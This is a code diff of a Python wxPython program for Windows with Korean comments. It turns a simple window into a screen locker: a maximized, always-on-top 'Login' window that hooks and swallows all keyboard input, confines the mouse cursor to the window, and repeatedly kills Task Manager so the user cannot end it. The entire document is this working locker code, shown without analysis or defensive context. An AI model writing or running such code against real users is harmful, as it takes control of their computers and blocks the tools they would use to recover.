@@ -1,35 +1,71 @@
 import wx
 import win32api
 import threading
+import time
+import os
+import psutil
+import pyWinhook
 
-def cursor() :
-    while True :
-        position = win32api.GetCursorPos()
-        if position[0] >= 1920 :
-            win32api.SetCursorPos((1920, position[1]))
+class blockInput(): # 키보드 입력 차단
+    def OnKeyboardEvent(self,event):
+        return False
 
-app = wx.App()
+    def block(self, keyboard = True):
+        if keyboard:
+            self.hm.KeyAll = self.OnKeyboardEvent
+            self.hm.HookKeyboard()
 
-entries = [wx.AcceleratorEntry() for i in range(2)]
+    def __init__(self):
+        self.hm = pyWinhook.HookManager()
 
-entries[0].Set(wx.ACCEL_ALT, wx.WXK_F4, 0, None)
+class Frame(wx.Frame) : # 프레임 생성
+    def __init__(self):
+        wx.Frame.__init__(self, None, title="Login", style=wx.CLOSE_BOX)
+        panel = wx.Panel(self)
 
-accel = wx.AcceleratorTable(entries)
+        def onClose(self) : # 닫기버튼
+            self.Destroy()
 
-title = "Login"
+        def cursor(): # 커서 가두기
+            while True:
+                width, height = self.GetSize()
+                win32api.ClipCursor((0, 0, width - 2, height))
+                time.sleep(1)
 
-frame = wx.Frame(parent = None, title = title, style=wx.CLOSE_BOX)
+        self.button = wx.Button(self, 1, label="닫기", pos=(100, 100), size=(300, 40))
+        self.Bind(wx.EVT_BUTTON, onClose, id=1)
 
-#frame.Bind(wx.EVT_LEAVE_WINDOW, wx.MessageBox('EVT_LEAVE_WINDOW','EVT_LEAVE_WINDOW',wx.OK))
-# wx.MouseState().SetPosition(self=this, pos=wx.Point(0, 0)))
+        thread = threading.Thread(target=cursor, daemon=True)
+        thread.start()
 
-thread = threading.Thread(target=cursor)
-thread.start()
+def disTask(): # 작업관리자 무력화
+    while True:
+        iter = psutil.process_iter()
+        for process in iter:
+            try:
+                if "taskmgr.exe" in process.name().lower():
+                    print("catch")
+                    os.system("taskkill /f /im taskmgr.exe")
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                print("except")
+                pass
 
-frame.SetTransparent(1)
-frame.SetAcceleratorTable(accel)
+app = wx.App(False)
+
+frame = Frame()
+print("frame")
+
+frame.SetTransparent(500)
 frame.SetWindowStyle(wx.STAY_ON_TOP)
 frame.Maximize()
 
 frame.Show()
+
+block = blockInput()
+block.block()
+
+taskThread = threading.Thread(target=disTask, daemon=True)
+taskThread.start()
+
 app.MainLoop()
+
